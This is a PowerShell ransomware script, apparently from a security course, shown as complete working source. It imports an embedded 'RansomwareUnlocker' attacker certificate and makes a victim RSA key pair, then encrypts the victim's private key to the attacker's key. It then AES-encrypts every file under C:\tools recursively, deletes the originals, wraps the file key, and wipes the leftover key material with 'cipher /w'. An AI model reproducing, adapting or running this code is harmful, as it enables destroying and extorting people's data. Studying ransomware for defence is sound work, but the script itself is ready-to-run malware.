Function Lock-Asymmetric {
[CmdletBinding()]
[OutputType([System.String])]
param(
    [Parameter(Position=0, Mandatory=$true)][ValidateNotNullOrEmpty()][System.String]
    $ClearText,
    [Parameter(Position=1, Mandatory=$true)][ValidateNotNullOrEmpty()][ValidateScript({Test-Path $_ -PathType Leaf})][System.String]
    $PublicCertFilePath
)
    # Encrypts a string with a public key
    $PublicCert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($PublicCertFilePath)
    $splitArray = $ClearText -split "(\w{32})"
    $fullEncryption = ""
    ForEach($chunck in $splitArray) {
        $ByteArray = [System.Text.Encoding]::UTF8.GetBytes($chunck)
        $EncryptedByteArray = $PublicCert.PublicKey.Key.Encrypt($ByteArray,$true)
        $EncryptedBase64String = [Convert]::ToBase64String($EncryptedByteArray)
        $fullEncryption = $fullEncryption + $EncryptedBase64String
    }
    Clear-Variable splitArray
    Remove-Variable splitArray
    Clear-Variable chunck
    Remove-Variable chunck
    Return $fullEncryption 
}

#Define function to create new symmetric key
function New-SymmetricKey()
{[CmdletBinding()]
[OutputType([System.Security.SecureString])]
[OutputType([String], ParameterSetName='PlainText')]
Param(
    [Parameter(Mandatory=$false, Position=1)]
    [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')]
    [String]$Algorithm='AES',
    [Parameter(Mandatory=$false, Position=2)]
    [Int]$KeySize,
    [Parameter(ParameterSetName='PlainText')]
    [Switch]$AsPlainText
)
    Process
    {
        try
        {
            $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)
            if($PSBoundParameters.ContainsKey('KeySize')){
                $Crypto.KeySize = $KeySize
            }
            $Crypto.GenerateKey()
            if($AsPlainText)
            {
                return [System.Convert]::ToBase64String($Crypto.Key)
            }
            else
            {
                return [System.Convert]::ToBase64String($Crypto.Key) | ConvertTo-SecureString -AsPlainText -Force
            }
        }
        catch
        {
            Write-Error $_
        }
        
    }
}

#define function to use a symmetric key to lock files
Function Lock-File
{[CmdletBinding(DefaultParameterSetName='SecureString')]
[OutputType([System.IO.FileInfo[]])]
Param(
    [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
    [Alias('PSPath','LiteralPath')]
    [string[]]$FileName,
    [Parameter(Mandatory=$false, Position=2)]
    [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')]
    [String]$Algorithm = 'AES',
    [Parameter(Mandatory=$false, Position=3, ParameterSetName='SecureString')]
    [System.Security.SecureString]$Key = (New-CryptographyKey -Algorithm $Algorithm),
    [Parameter(Mandatory=$true, Position=3, ParameterSetName='PlainText')]
    [String]$KeyAsPlainText,
    [Parameter(Mandatory=$false, Position=4)]
    [System.Security.Cryptography.CipherMode]$CipherMode,
    [Parameter(Mandatory=$false, Position=5)]
    [System.Security.Cryptography.PaddingMode]$PaddingMode,
    [Parameter(Mandatory=$false, Position=6)]
    [String]$Suffix = ".$Algorithm",
    [Parameter()]
    [Switch]$RemoveSource
)
    Begin {
        #Configure cryptography
        try {
            #If we got a plaintext
            if($PSCmdlet.ParameterSetName -eq 'PlainText') {
                $Key = $KeyAsPlainText | ConvertTo-SecureString -AsPlainText -Force
            }

            #Decrypt cryptography Key from SecureString
            $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Key)
            $EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR))

            $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)
            if($PSBoundParameters.ContainsKey('CipherMode')){
                $Crypto.Mode = $CipherMode
            }
            if($PSBoundParameters.ContainsKey('PaddingMode')){
                $Crypto.Padding = $PaddingMode
            }
            $Crypto.KeySize = $EncryptionKey.Length*8
            $Crypto.Key = $EncryptionKey
        } Catch {
            Write-Error $_ -ErrorAction Stop
        }
    } Process {
        $Files = Get-Item -LiteralPath $FileName
    
        ForEach($File in $Files) {
            # Check if this is a file
            if (Test-Path -Path $File -PathType Leaf) {
                $DestinationFile = $File.FullName + $Suffix

                Try {
                    $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)
                    $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)

                    #Write IV (initialization-vector) length & IV to encrypted file
                    $Crypto.GenerateIV()
                    $FileStreamWriter.Write([System.BitConverter]::GetBytes($Crypto.IV.Length), 0, 4)
                    $FileStreamWriter.Write($Crypto.IV, 0, $Crypto.IV.Length)

                    #Perform encryption
                    $Transform = $Crypto.CreateEncryptor()
                    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
                    $FileStreamReader.CopyTo($CryptoStream)
        
                    #Close open files
                    $CryptoStream.FlushFinalBlock()
                    $CryptoStream.Close()
                    $FileStreamReader.Close()
                    $FileStreamWriter.Close()

                    #Delete unencrypted file
                    if($RemoveSource){Remove-Item -LiteralPath $File.FullName}

                    #Output ecrypted file
                    #$result = Get-Item $DestinationFile
                    #$result | Add-Member –MemberType NoteProperty –Name SourceFile –Value $File.FullName
                    #$result | Add-Member –MemberType NoteProperty –Name Algorithm –Value $Algorithm
                    #$result | Add-Member –MemberType NoteProperty –Name Key –Value $Key
                    #$result | Add-Member –MemberType NoteProperty –Name CipherMode –Value $Crypto.Mode
                    #$result | Add-Member –MemberType NoteProperty –Name PaddingMode –Value $Crypto.Padding
                    #$result
                } Catch {
                    Write-Error $_
                    If($FileStreamWriter) {
                        #Remove failed file
                        $FileStreamWriter.Close()
                        Remove-Item -LiteralPath $DestinationFile -Force
                    } Continue
                } Finally {
                    if($CryptoStream){$CryptoStream.Close()}
                    if($FileStreamReader){$FileStreamReader.Close()}
                    if($FileStreamWriter){$FileStreamWriter.Close()}
                }
            }
        }
    }
}

New-Item -ItemType Directory -Force -Path C:\temp\byebye\goaway

#------------------------------------------------------------------
#   Import the attacker public key into the keystore
#------------------------------------------------------------------
$store = "cert:\CurrentUser\My"
$cert2 = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
$base64 = "MIIDCzCCAfOgAwIBAgIQWQ3mTMtQh45PtIzCk+eqizANBgkqhkiG9w0BAQsFADAdMRswGQYDVQQDDBJSYW5zb213YXJlVW5sb2NrZXIwHhcNMjAxMTI1MDIyOTA4WhcNMjExMTI1MDI0OTA4WjAdMRswGQYDVQQDDBJSYW5zb213YXJlVW5sb2NrZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC+3K2PRs70ekom4XIoLwwbBaxZl5rY9T74r+L+BufmdzudUk01KBwFuoZ6NbxX14n9X85eousWiLO6R7lPU1hkVvnqoFCUe9+vpD0dxfYF4gLzY9mewdpccF7Iw2pTHgxGAHL9bPK2Z2y400KXGK5twHiJYX1Y+ClGmjWOA6zJuLG0fElqUimir/ht1/plV/1sgw0ksBfMXjRPWtPq7644NKcVDhdaIg60gBDcmfugTbXscFZSeKwfJEUecuYhv0ytgi9VNOd+9T44mtkpRUTBcIJbzj9tBpfvwlB4dkfPiZQMzL5xnL45WMe+K/8j63RHTAHD7nRirWNgutbkRFYdAgMBAAGjRzBFMA4GA1UdDwEB/wQEAwIEEDAUBgNVHSUEDTALBgkrBgEEAYI3UAEwHQYDVR0OBBYEFC/pcHXppW3JGE7seeLeLkrzw0lNMA0GCSqGSIb3DQEBCwUAA4IBAQCQsloKqMZiRRn0PxoLInNkcX/kDsfweXODWHhSR80agETke0mIhdzLkW2C6/vOL6nfkTyd2caQ4841B8GN5uaAesdTKg+oWDMRjsF/SKVOrt43yIJr1tsUCIT60xev4P+VSpbcNNBMze6u0gLbpG9XLDiDSSUuZFnuhSv6M8lUOo0Lu8xtIISoD6h/+GQ+Ee2dJErFBgNAiYveBMn3sbB5XoRppyCNKPK1WaioZG8aHlOdDsrgw0otvglufiVQVqhCuPLD9BS5JLX58h+l5EC0eXUajiv2btl9WAPStKh4HpUuuOgIkzGI9xvXXHPHPCvFu3DH8VBy75ZnJdwo2RTq"
$cert2.Import([Convert]::FromBase64String($base64))
$attackerPublicLocation = "C:\temp\byebye\locker.cer"
Export-Certificate -FilePath $attackerPublicLocation -Cert $cert2
Import-Certificate -FilePath $attackerPublicLocation -CertStoreLocation $store




#------------------------------------------------------------------
#   Create the victim public and private key
#------------------------------------------------------------------
#Define parameters to make new RSA pair
$params = @{
    CertStoreLocation = $store
    Subject = "CN=ClientPair"
    KeyLength = 2048
    KeyAlgorithm = "RSA" 
    KeyUsage = "DataEncipherment"
    Type = "DocumentEncryptionCert"
}

# generate new certificate and add it to certificate store
$cert = New-SelfSignedCertificate @params




#------------------------------------------------------------------
#   Export victim keys
#------------------------------------------------------------------
#export the victim's public key
$publicKeyLocation = "C:\temp\byebye\ClientPublic.cer"
Export-Certificate -FilePath $publicKeyLocation -Cert $cert

#Write the public key in base64
#$encodedcert = [Convert]::ToBase64String([IO.File]::ReadAllBytes($publicKeyLocation))
#Write-Host "Base64 encoded certificate: $encodedcert" -ForegroundColor Green

#save this base64 to a text file
#$publicKeyTextLocation = "$home\Documents\UNT\5550\Ransom\ClientPublic.txt"
#Write-Output ("$encodedcert") > $publicKeyTextLocation

#export the victim's private key
$privateKeyLocation = "C:\temp\byebye\goaway\ClientPrivate.pfx"
$exportPassword = ("37rcnb0o89r7nbc938wo47cn" | ConvertTo-SecureString -AsPlainText -Force)
Export-PfxCertificate -FilePath $privateKeyLocation -Cert $cert -Password $exportPassword




#------------------------------------------------------------------
#   Remove victim keys
#------------------------------------------------------------------
#Remove victim certificate from store
$cert | Remove-Item
Clear-Variable cert
Remove-Variable cert

#------------------------------------------------------------------
#   Encrypt victim private key
#------------------------------------------------------------------
$victimPrivateEncryptedLocation = "C:\temp\byebye\ClientPrivateEncrypted.txt"
$base64victimPrivate = [Convert]::ToBase64String([IO.File]::ReadAllBytes($privateKeyLocation))
$encrypted64victimPrivate = Lock-Asymmetric $base64victimPrivate $attackerPublicLocation
Write-Output ("$encrypted64victimPrivate") > $victimPrivateEncryptedLocation

#completely delete the unencrypted victim private key
Clear-Variable base64victimPrivate
Remove-Variable base64victimPrivate
Remove-Item $privateKeyLocation



#------------------------------------------------------------------
#   Generate symmetric key for file encryption
#------------------------------------------------------------------
#Generate a new symmetric key for encrypting user files
$key = New-SymmetricKey -AsPlainText
$secureKey = ConvertTo-SecureString $key -AsPlainText -Force


#------------------------------------------------------------------
#   Encrypt some files with the symmetric key
#------------------------------------------------------------------
#Recursively use this symmetric key to encrypt everything in the folder
Get-ChildItem 'C:\tools' -Recurse | Lock-File -Algorithm AES -Key $secureKey -RemoveSource


#------------------------------------------------------------------
#   Encrypt the symmetric key with victim's public key
#------------------------------------------------------------------
$encryptedSymmetricLocation = "C:\temp\byebye\symmetricencrypted.txt"
$encryptedSymmetric = Lock-Asymmetric $key $publicKeyLocation
Write-Output ("$encryptedSymmetric") > $encryptedSymmetricLocation

Clear-Variable key
Remove-Variable key
Clear-Variable secureKey
Remove-Variable secureKey


#remove attacker public
Get-ChildItem $store |
Where-Object { $_.Subject -match 'RansomwareUnlocker' } |
Remove-Item

#remove victim public
Get-ChildItem $store |
Where-Object { $_.Subject -match 'ClientPair' } |
Remove-Item

#this will try to shred any remaining data of the victim's private key
Cipher /w:C:\temp\byebye\goaway
